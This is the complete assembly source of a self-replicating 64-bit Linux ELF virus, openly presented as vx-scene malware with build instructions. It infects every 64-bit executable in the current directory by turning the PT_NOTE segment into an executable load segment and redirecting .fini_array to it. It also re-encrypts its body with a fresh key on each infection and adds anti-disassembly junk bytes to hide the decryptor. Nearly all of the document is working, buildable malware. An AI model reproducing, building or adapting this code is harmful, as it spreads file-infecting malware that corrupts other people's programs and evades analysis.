;####################################
;##      A  64 bit ELF virus       ##
;##      infecting .fini_array     ##
;##      By S01den and Sblip       ##
;####################################

;.____    .__         ________   _____     ___________             ________ .__
;|    |   |__| ____  /  _____/  /  |  |    \_   _____/ ____    ____\_____  \|  |   ______    _____    ______ _____
;|    |   |  |/    \/   __  \  /   |  |_    |    __)_ /    \  / ___\ _(__  <|  |  /  ___/    \__  \  /  ___//     \
;|    |___|  |   |  \  |__\  \/    ^   /    |        \   |  \/ /_/  >       \  |__\___ \      / __ \_\___ \|  Y Y  \
;|_______ \__|___|  /\_____  /\____   | /\ /_______  /___|  /\___  /______  /____/____  > /\ (____  /____  >__|_|  /
;        \/       \/       \/      |__| \/         \/     \//_____/       \/          \/  \/      \/     \/      \/

; This is a (widely) modified version of Lin64.Kropotkine
; Infection through PT_NOTE infection. Made with love by S01den and Sblip for Project:Fu
; No modification of entry point this time ! Just hijack .fini_array to make it point to the converted PT_NOTE segment.
; --> Thus, the virus is executed after the host code.
; However, it doesn't work on PIE binaries :/
; Features: encryption (with a different key for every new infection) + fake polymorphism to hide the decryption routine

; Build command:
; nasm -f elf64 Linux.Eng3ls.asm ; ld Linux.Eng3ls.o -o eng3ls

; long live to the vx scene !

;---------------------------------- CUT HERE ----------------------------------
; some structs, thanks https://en.wikipedia.org/wiki/Executable_and_Linkable_Format !

struc STAT
    .st_dev         resq 1
    .st_ino         resq 1
    .st_nlink       resq 1
    .st_mode        resd 1
    .st_uid         resd 1
    .st_gid         resd 1
    .pad0           resb 4
    .st_rdev        resq 1
    .st_size        resq 1
    .st_blksize     resq 1
    .st_blocks      resq 1
    .st_atime       resq 1
    .st_atime_nsec  resq 1
    .st_mtime       resq 1
    .st_mtime_nsec  resq 1
    .st_ctime       resq 1
    .st_ctime_nsec  resq 1
endstruc

struc e_hdr
	.magic		resd 1 ; 0x7F followed by ELF(45 4c 46) in ASCII; these four bytes constitute the magic number.
	.class		resb 1 ; This byte is set to either 1 or 2 to signify 32- or 64-bit format, respectively.
	.data		resb 1 ; This byte is set to either 1 or 2 to signify little or big endianness, respectively. This affects interpretation of multi-byte fields starting with offset 0x10.
	.elf_version resb 1 ; Set to 1 for the original and current version of ELF.
	.os 		resb 1 ; Identifies the target operating system ABI.
	.abi_version resb 1
	.padding	resb 7 ; currently unused, should be filled with zeros. <--------- that will be the place where we will put out signature
	.type		resb 2 ; Identifies object file type.
	.machine	resb 2 ; Specifies target instruction set architecture.
	.e_version	resb 4 ; Set to 1 for the original version of ELF.
	.entry		resq 1 ; this is the entry point
	.phoff		resq 1 ; Points to the start of the program header table.
	.shoff		resq 1 ; Points to the start of the section header table.
	.flags		resb 4 ; Interpretation of this field depends on the target architecture.
	.ehsize		resb 2 ; Contains the size of this header, normally 64 Bytes for 64-bit and 52 Bytes for 32-bit format.
	.phentsize	resb 2 ; Contains the size of a program header table entry.
	.phnum		resb 2 ; Contains the number of entries in the program header table.
	.shentsize	resb 2 ; Contains the size of a section header table entry.
	.shnum		resb 2 ; Contains the number of entries in the section header table.
	.shstrndx	resb 2 ; Contains index of the section header table entry that contains the section names.
	.end		resb 1
endstruc

struc e_phdr
	.type	resb 4 ; Identifies the type of the segment. (The number which interest us are: 0 = PT_NULL | 1 = PT_LOAD | 2 = PT_DYNAMIC | 4 = PT_NOTE)
	.flags	resd 1 ; Segment-dependent flags (position for 64-bit structure).
	.offset resq 1 ; Offset of the segment in the file image.
	.vaddr	resq 1 ; Virtual address of the segment in memory.
	.paddr	resq 1 ; On systems where physical address is relevant, reserved for segments physical address.
	.filesz resq 1 ; Size in bytes of the segment in the file image.
	.memsz 	resq 1 ; Size in bytes of the segment in memory.
	.align	resq 1 ; 0 and 1 specify no alignment. Otherwise should be a positive, integral power of 2, with p_vaddr equating p_offset modulus p_align.
	.end	resb 1
endstruc

struc e_shdr
	.name	resb 4 ; An offset to a string in the .shstrtab section that represents the name of this section.
	.type	resb 4 ; Identifies the type of this header.
	.flags	resq 1 ; Identifies the attributes of the section.
	.addr   resq 1 ; Virtual address of the section in memory, for sections that are loaded.
	.offset resq 1 ; Offset of the section in the file image.
	.size   resq 1 ; Size in bytes of the section in the file image.
	.link   resb 4
	.info   resb 4
	.addralign resq 1 ; Contains the required alignment of the section.
	.entsize resq 1 ; Contains the size, in bytes, of each entry, for sections that contain fixed-size entries.
	.end	resb 1
endstruc

%define VXSIZE 0x305
%define STUB_SIZE 0x88
%define BUFFSIZE 1024

section .text
global _start

_start:

main:
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
mov r14, rsp
add rsp, VXSIZE
mov r15, rsp

jmp code
getaddr:
	pop r12		; address of code
  sub r12, STUB_SIZE
	xor r8, r8

	push VXSIZE ; [length of shellcode]
	pop rsi
  add rsi, VXSIZE
	xor rdi, rdi
	mov rdx, 0x7								; protect RW = PROT_READ (0x04) | PROT_WRITE (0x02) | PROT_EXEC (0x01)
	xor r9, r9								; r9 = 0 <=> offset_start = 0
	mov r10, 0x22   					; flag = MAP_SHARED | MAP_ANONYMOUS
	push 9
	pop rax 								; mmap syscall number
	syscall
	mov rbx, rax

	push rsi
	pop rcx
	jmp jmp_over+2
	jmp_over:
	db `\x48\x31` ; false disassembly
	mov al,0x00
	xor rdx, rdx
decoder:
  jmp jmp_over2+2
  jmp_over2:
  db `\xb8\xd9` ; false disassembly
	mov dl, byte [r12+rdi]
  cmp rdi, STUB_SIZE-1
  jna no_decrypt
  jmp jmp_over3+2
  jmp_over3:
  db `\x48\x81` ; false disassembly
	xor dl, al
  no_decrypt:
	mov byte [rbx+rdi], dl
	inc rdi
	loop decoder

  mov r15, rbx
  add rbx, STUB_SIZE
	jmp rbx		; jmp to decrypted code

code:
	call getaddr

	add rsp, VXSIZE
	add rsp, VXSIZE
	add rsp, 0x100

	jmp getdot

vx:
	pop rdi
	mov rax, 2		; open syscall
	xor rsi,rsi	;  flags = rdonly
	syscall		; and awaaaaay we go

	; we use the stack to hold dirents

	mov rdi, rax
	mov rax, 217
	mov rsi, rsp
	mov rdx, BUFFSIZE
	syscall

	cmp rax, 0
	jl payload

	mov r13, rax

	xor rbx, rbx
	loop:

		mov rax, rsp
		add rax, 0x13 ; d_name

		; write the name
		mov rsi, rax
		mov rdi, 1

		xor rcx, rcx
		mov cl, byte [rsp+0x12] ; rcx now contains the type of data (directory or file)

		push rbx

		call infect
		pop rbx

		mov ax, [rsp+0x10] ; the buffer position += d_reclen
		add rbx, rax
		add rsp, rax

		cmp rbx, r13
		jl loop
		jmp payload

infect:
	mov rbp, rsp
	cmp rcx, 0x8 ; check if the thing we will try to inject is a file or a directory (0x4 = dir | 0x8 = file)
	jne end

	; open the file
	mov rdi, rsi
	mov rax, 2
	mov rsi, 0x402 ; RW mode
	syscall

	cmp rax, 0
	jng end

	mov rbx, rax

	; stat the file to know its length
	mov rsi, rsp
	sub rsi, r13
	mov rax, 4
	syscall

	; mmap the file
	mov r8, rbx   							; the fd
	mov rsi, [rsi+STAT.st_size] 			; the len

	mov rdi, 0								; we write this shit on the stack
	mov rdx, 6								; protect RW = PROT_READ (0x04) | PROT_WRITE (0x02)
	xor r9, r9								; r9 = 0 <=> offset_start = 0
	mov r10, 0x1   							; flag = MAP_SHARED
	xor rax, rax
	mov rax, 9 								; mmap syscall number
	syscall

	; rax now contains the addr where the file is mapped

	cmp dword [rax+e_hdr.magic], 0x464c457f ; check if the file is an ELF
	je get_bits

	end:
		mov rax, 3   ; close
		mov rdi, rbx
		syscall
		xor rax, rax
		; epilogue
		mov rsp, rbp
		ret

get_bits: ; check if the binary is 64 bits
	cmp byte [rax+e_hdr.class], 2
	je check_et_exec
	jmp end

check_et_exec:
  cmp word [rax+e_hdr.type], 2
  je check_signature
  jmp end

check_signature:
	cmp dword [rax+e_hdr.padding], 0xdeadc0de ; the signature (to check if a file is already infected)
	jne parse_phdr
	xor rax, rax
	; epilogue
	mov rsp, rbp
	ret

parse_phdr:
	xor rcx, rcx
	xor rdx, rdx
	mov cx, word [rax+e_hdr.phnum] 	   ;	rcx contains the number of entries in the program header table
	mov rbx, qword [rax+e_hdr.phoff]   ;	rbx contains the offset of the program header table
	mov dx, word [rax+e_hdr.phentsize] ;	rdx contains the size of an entry in the program header table

	loop_phdr:
		add rbx, rdx
		dec rcx
		cmp dword [rax+rbx+e_phdr.type], 0x4
		je pt_note_found
		cmp rcx, 0
		jg loop_phdr

pt_note_found:
	; Now, we finally infect the file !

	mov dword [rax+e_hdr.padding], 0xdeadc0de ; write the signature of the virus
	mov dword [rax+rbx+e_phdr.type], 0x01 	; change to PT_LOAD
	mov dword [rax+rbx+e_phdr.flags], 0x07  ; Change the memory protections for this segment to allow executable instructions (0x07 = PT_R | PT_X | PT_W)
	mov r9, 0xc000000
	add r9, rsi 							; the new entry point (= a virtual address far from the end of the original program)
	mov qword [rax+rbx+e_phdr.vaddr], r9

	mov rdi, qword [rax+rbx+e_phdr.filesz]   ; p.Filesz += injectSize
	add rdi, VXSIZE
	mov qword [rax+rbx+e_phdr.filesz], rdi

	mov rdi, qword [rax+rbx+e_phdr.memsz]    ; p.Memsz += injectSize
	add rdi, VXSIZE
	mov qword [rax+rbx+e_phdr.memsz], rdi

	mov qword [rax+rbx+e_phdr.offset], rsi   ; p.Off = uint64(fsize)

parse_shdr:
  xor rcx, rcx
  xor rdx, rdx
  mov cx, word [rax+e_hdr.shnum] 	   ;	rcx contains the number of entries in the program header table
  mov rbx, qword [rax+e_hdr.shoff]   ;	rbx contains the offset of the program header table
  mov dx, word [rax+e_hdr.shentsize] ;	rdx contains the size of an entry in the program header table

  loop_shdr:
    add rbx, rdx
    dec rcx
    cmp dword [rax+rbx+e_shdr.type], 0x0F ; 0x0F = SHT_FINI_ARRAY, the section we're looking to modify
    je dtor_found
    cmp rcx, 0
    jg loop_shdr

dtor_found:
  mov rdx, qword [rax+rbx+e_shdr.offset]
  mov [rax+rdx], r9

	mov rdx, 4
	mov rdi, rax
	mov rax, 26
	syscall           ; msync syscall: apply the change to the file

	mov rax, 11
	syscall           ; munmap

  ; randomly change the false disassembly bytes
  rdtsc
  xor ax, 0xacab
  mov word [r15+0x51],ax
  xor dx, 0xcafe
  mov word [r15+0x5a],dx
  xor ax, 0xc0
  mov word [r15+0x6b],ax
  ; the new encryption key:
  xor ax, 0xdead
  mov cl, byte [r15+0x54] ; get the old key
  mov byte [r15+0x54], al ; replace it with the new key

  xor rdx, rdx
  xor rbx, rbx

  copy_stub:
    mov bl, byte[r15+rdx]
    mov byte[r15+VXSIZE+rdx], bl
    inc rdx
    cmp rdx, STUB_SIZE
    jne copy_stub

  encrypt_body:
    mov bl, byte [r15+rdx]
    ;xor bl, cl ; decrypt
    xor bl, al ; encrypt with the new key
    mov byte [r15+VXSIZE+rdx], bl
    inc rdx
    cmp rdx, VXSIZE
    jne encrypt_body

	mov rdi, r8
	mov rsi, r15
  add rsi, VXSIZE
	mov rdx, VXSIZE
	add rdx, 46
	mov rax, 1 		  ; write the vx
	syscall

	mov rax, 3		  ; close
	syscall

	; epilogue
	mov rsp, rbp
	ret

payload:
    mov rax, 1
    xor rdi, rdi
    inc rdi
    push 0x585f580a
    mov rsi, rsp
    mov rdx, 4
    syscall

    mov rax, 60
    syscall

clean:
	xor rcx, rcx
	xor rbx, rbx
	xor rax, rax
	xor rdx, rdx
	ret

get_eip:
	mov rax, [rsp]
    ret

getdot:
	call vx
	db '.'
	dw 0x0

;--------------------------------------------------------------------------------------------------------------------------

;___________               _______          __
;\__    ___/____ ______    \   _  \  __ ___/  |_
;  |    | /     \\____ \   /  /_\  \|  |  \   __\
;  |    ||  Y Y  \  |_> >  \  \_/   \  |  /|  |
;  |____||__|_|  /   __/ /\ \_____  /____/ |__|
;              \/|__|    \/       \/              in your stack...
